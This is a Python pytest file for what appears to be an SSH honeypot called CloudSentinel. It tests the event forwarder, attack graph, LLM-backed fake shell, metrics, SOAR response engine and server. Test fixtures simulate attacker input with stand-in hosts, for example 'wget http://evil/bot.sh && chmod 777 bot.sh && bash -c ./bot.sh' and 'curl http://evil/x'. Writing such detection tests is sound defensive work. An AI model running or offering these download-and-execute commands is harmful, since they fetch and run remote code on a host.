"""Final coverage batch: forwarder, graph, VFS agent, observability, metrics, SOAR, server."""

from __future__ import annotations

import asyncio
import sys
import time
import types

import pytest

from cloudsentinel import metrics as metrics_module
from cloudsentinel.attack_graph import AttackGraph
from cloudsentinel.config import LLMSettings, RedisSettings, load_settings
from cloudsentinel.pipeline import ClickHouseForwarder, EventEnvelope
from cloudsentinel.sandbox import create_sandbox
from cloudsentinel.server import (
    CloudSentinelSSHServer,
    CloudSentinelSession,
    ConnectionLimiter,
)
from cloudsentinel.soar import SOAREngine
from cloudsentinel.vfs_agent import VFSAgent, VFSContext


class FakeChannel:
    def __init__(self) -> None:
        self.output = b""
        self.exits: list[int] = []

    def write(self, data: str | bytes) -> None:
        if isinstance(data, str):
            data = data.encode()
        self.output += data

    def exit(self, status: int = 0) -> None:
        self.exits.append(status)


def _session():
    settings = load_settings(
        "src/cloudsentinel/configs/usas-production.yaml",
        "src/cloudsentinel/.env",
    )
    settings.llm.provider = "mock"

    async def emit_event(*_args: object, **_kwargs: object) -> None:
        return None

    fake_server = type(
        "FakeServer",
        (),
        {
            "settings": settings,
            "username": "root",
            "src_ip": "8.8.8.8",
            "started_at": time.time(),
            "anomaly_detector": None,
            "_emit_event": emit_event,
            "_fuzz_detected": False,
            "_tty_logger": type("TTY", (), {"record": lambda self, _data: None})(),
        },
    )()
    return CloudSentinelSession(fake_server)


@pytest.mark.asyncio
async def test_clickhouse_forwarder_run(tmp_path) -> None:
    class FakeResult:
        def __init__(self, rows: list) -> None:
            self.result_rows = rows

    class FakeClient:
        def __init__(self) -> None:
            self.rows: list = []

        def insert(self, _table: str, data: list, **_kwargs: object) -> None:
            self.rows.extend(data)

    class FakeRedis:
        def __init__(self, forwarder: ClickHouseForwarder) -> None:
            self.forwarder = forwarder
            self.calls = 0

        async def xread(self, *_args: object, **_kwargs: object) -> list:
            self.calls += 1
            if self.calls == 1:
                envelope = EventEnvelope(
                    event_type="cloudsentinel.command.input",
                    session_id="forward-1",
                    src_ip="8.8.8.8",
                    src_port=1,
                    timestamp=time.time(),
                    payload={"eventid": "cloudsentinel.command.input"},
                )
                return [("stream", [("1-0", envelope.to_redis_fields())])]
            self.forwarder._stopped.set()
            return []

    settings = load_settings(
        "src/cloudsentinel/configs/usas-production.yaml",
        "src/cloudsentinel/.env",
    )
    settings.clickhouse.enabled = False
    disabled = ClickHouseForwarder(settings.redis, settings.clickhouse)
    await disabled.start()
    await disabled.stop()

    settings.clickhouse.enabled = True
    forwarder = ClickHouseForwarder(settings.redis, settings.clickhouse)
    forwarder._client = FakeClient()
    forwarder._checkpoint_path = tmp_path / "lastid"
    forwarder._redis = FakeRedis(forwarder)  # type: ignore[assignment]
    await forwarder._run()
    assert forwarder._client.rows


def test_attack_graph_branches() -> None:
    graph = AttackGraph(max_nodes=2)
    graph.add_event({"src_ip": "", "session": "x"})
    graph.add_event({"src_ip": "10.0.0.1", "session": "x"})
    graph.add_event(
        {
            "src_ip": "8.8.8.8",
            "session": "s",
            "hassh_md5": "c" * 32,
            "eventid": "cloudsentinel.login.failed",
            "username": "root",
        }
    )
    graph.add_event(
        {
            "src_ip": "8.8.4.4",
            "session": "s2",
            "eventid": "cloudsentinel.command.input",
            "input": "ssh root@10.0.0.9",
            "cloudsentinel_mitre_techniques": ["T1021.004"],
        }
    )
    assert graph.to_cytoscape()["elements"]
    assert graph.get_subgraph("8.8.8.8")["nodes"]


def test_vfs_agent_branches() -> None:
    agent = VFSAgent(LLMSettings(provider="mock"), VFSContext("unit-host", "Ubuntu"))
    try:
        assert agent._is_templated_command("netstat -antp")
        assert agent._is_blocked_command("systemctl status")
        assert agent._is_complex_or_binary("curl http://evil/x")
        assert agent._mock_response("hostname") == "unit-host"
        assert agent._mock_response("pwd") == "/root"
        assert agent._mock_response("id").startswith("uid=0")
        assert agent._mock_response("uname").startswith("Linux")
        assert agent._mock_response("ls")
        assert agent._mock_response("date")
        assert agent._mock_response("uptime")
        assert agent._mock_response("ps")
        assert agent._mock_response("free")
        assert agent._mock_response("df")
        assert agent._mock_response("echo hello").strip() == "hello"
        assert "No such file" in agent._handle_file_read("cat /missing")
        agent._cache["expired"] = (0.0, "old")
        assert agent._get_cache("expired") is None
        for index in range(300):
            agent._set_cache(f"cmd-{index}", "value")
        assert agent._handle_local_state("cd ..") == ""
        assert agent._handle_local_state("export A=1") == ""
    finally:
        asyncio.run(agent.close())


def test_observability_optional_modules(monkeypatch: pytest.MonkeyPatch) -> None:
    calls: list[str] = []

    fake_sentry = types.ModuleType("sentry_sdk")
    fake_sentry.init = lambda **_kwargs: calls.append("sentry")
    monkeypatch.setitem(sys.modules, "sentry_sdk", fake_sentry)
    fake_pyro = types.ModuleType("pyroscope")
    fake_pyro.configure = lambda **_kwargs: calls.append("pyro")
    monkeypatch.setitem(sys.modules, "pyroscope", fake_pyro)
    from cloudsentinel.observability import setup_pyroscope, setup_sentry

    setup_sentry("dsn")
    setup_pyroscope("unit")
    assert "sentry" in calls
    assert "pyro" in calls


def test_metrics_properties() -> None:
    metrics = metrics_module.get_metrics()
    assert metrics.active_sessions >= 0
    assert metrics.mttb_ms >= 0
    assert metrics.total_connections >= 0
    assert metrics.total_auth_failures >= 0
    assert metrics.total_auth_successes >= 0
    assert metrics.total_commands >= 0
    assert metrics.total_blocks >= 0
    assert metrics.total_blocks_iptables >= 0
    assert metrics.pipeline_is_connected in {0, 1}
    assert metrics.pending_events >= 0
    assert metrics.content_type.startswith("text/plain")


@pytest.mark.asyncio
async def test_soar_more_branches() -> None:
    soar = SOAREngine(risk_threshold=70, firewall_enabled=False, firewall_dry_run=True)
    assert soar.is_allowlisted("10.1.1.1") is True
    assert soar.is_allowlisted("8.8.8.8") is False
    low = await soar.process_event(
        "low",
        {
            "eventid": "cloudsentinel.session.connect",
            "session": "low",
            "src_ip": "8.8.8.8",
        },
    )
    assert low["cloudsentinel_soar_action"] in {"none", "detect_only"}
    high = await soar.process_event(
        "high",
        {
            "eventid": "cloudsentinel.command.input",
            "session": "high",
            "src_ip": "8.8.8.8",
            "input": "wget http://evil/bot.sh && chmod 777 bot.sh && bash -c ./bot.sh",
        },
    )
    assert high["cloudsentinel_soar_action"] in {"detect_only", "none"}


@pytest.mark.asyncio
async def test_server_extra_branches() -> None:
    session = _session()
    channel = FakeChannel()
    session.connection_made(channel)
    session.data_received("a" * 70000, None)
    assert session.server._fuzz_detected is True
    session.data_received("\x04", None)
    await session.vfs.close()

    settings = load_settings(
        "src/cloudsentinel/configs/usas-production.yaml",
        "src/cloudsentinel/.env",
    )
    server = CloudSentinelSSHServer(
        settings=settings,
        pipeline=types.SimpleNamespace(),
        soar=types.SimpleNamespace(),
        hassh_dna=types.SimpleNamespace(),
        limiter=ConnectionLimiter(max_total=0),
    )
    server._accepted = True
    server._fuzz_detected = True
    assert server.begin_auth("root") is False
    server._fuzz_detected = False
    server.started_at = time.time() - 4000
    assert server.begin_auth("root") is False
